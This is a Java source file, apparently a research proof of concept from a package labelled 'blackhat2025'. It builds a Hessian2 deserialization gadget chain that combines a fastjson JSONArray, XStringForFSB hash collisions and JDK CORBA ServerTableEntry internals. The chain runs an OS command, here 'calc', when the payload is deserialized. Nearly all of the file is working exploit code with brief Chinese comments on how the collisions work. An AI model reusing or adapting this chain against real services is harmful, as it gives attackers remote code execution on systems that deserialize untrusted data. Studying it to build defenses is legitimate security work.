package com.test.gadget.blackhat2025;

import com.alibaba.fastjson.JSONArray;
import com.sun.corba.se.impl.activation.ServerManagerImpl;
import com.sun.corba.se.impl.activation.ServerTableEntry;
import com.sun.deploy.nativesandbox.IntegrityProcess;
import com.sun.org.apache.xpath.internal.objects.XStringForFSB;
import tools.HessianTools;
import tools.ReflectTools;
import tools.UnsafeTools;

import java.util.AbstractMap;
import java.util.HashMap;

public class XStringFSB2toString {
    public static void main(String[] args) throws Exception {
        Object payload = getPayload();
        byte[] bytes = HessianTools.hessianSer2bytes(payload, "2");
        HessianTools.hessianDeser(bytes, "2");
    }

    public static Object getPayload() throws Exception {
        Object entry = UnsafeTools.getObjectByUnsafe(ServerTableEntry.class);
        // process.exit不能报错；linux下使用UNIXProcess即可
        Object process = UnsafeTools.getObjectByUnsafe(IntegrityProcess.class);
        ReflectTools.setFieldValue(entry, "state", 2);
        ReflectTools.setFieldValue(entry, "process", process);
        ReflectTools.setFieldValue(entry, "activationCmd", "calc");

        HashMap<Object, Object> hashMap = new HashMap<>();
        // 键一定是Integer
        hashMap.put(1, entry);

        Object serverManager = UnsafeTools.getObjectByUnsafe(ServerManagerImpl.class);
        ReflectTools.setFieldValue(serverManager, "serverTable", hashMap);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(serverManager);

        Object xString = UnsafeTools.getObjectByUnsafe(XStringForFSB.class);
//        String unhash = unhash(jsonArray.hashCode());
        ReflectTools.setFieldValue(xString, "m_strCache", "notNull1");

        // 不知道为什么要包一层
//        Object simple = UnsafeTools.getObjectByUnsafe(AbstractMap.SimpleEntry.class);
        // 这里的key 是 final private，但是竟然能直接赋值成功
//        ReflectTools.setFieldValue(simple, "key", jsonArray);

        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();
        // 键值不能改，确保hashCode碰撞，才能进入equals
        hashMap1.put("zZ", xString);
        hashMap1.put("yy", jsonArray);
        hashMap2.put("yy", xString);
        hashMap2.put("zZ", jsonArray);

        HashMap<Object, Object> finalMap = ReflectTools.makeMap(hashMap1, hashMap2);

        return finalMap;
    }

    public static String unhash ( int hash ) {
        int target = hash;
        StringBuilder answer = new StringBuilder();
        if ( target < 0 ) {
            // String with hash of Integer.MIN_VALUE, 0x80000000
            answer.append("\u0915\u0009\u001e\u000c\u0002");

            if ( target == Integer.MIN_VALUE )
                return answer.toString();
            // Find target without sign bit set
            target = target & Integer.MAX_VALUE;
        }

        unhash0(answer, target);
        return answer.toString();
    }
    private static void unhash0 ( StringBuilder partial, int target ) {
        int div = target / 31;
        int rem = target % 31;

        if ( div <= Character.MAX_VALUE ) {
            if ( div != 0 )
                partial.append((char) div);
            partial.append((char) rem);
        }
        else {
            unhash0(partial, div);
            partial.append((char) rem);
        }
    }
}
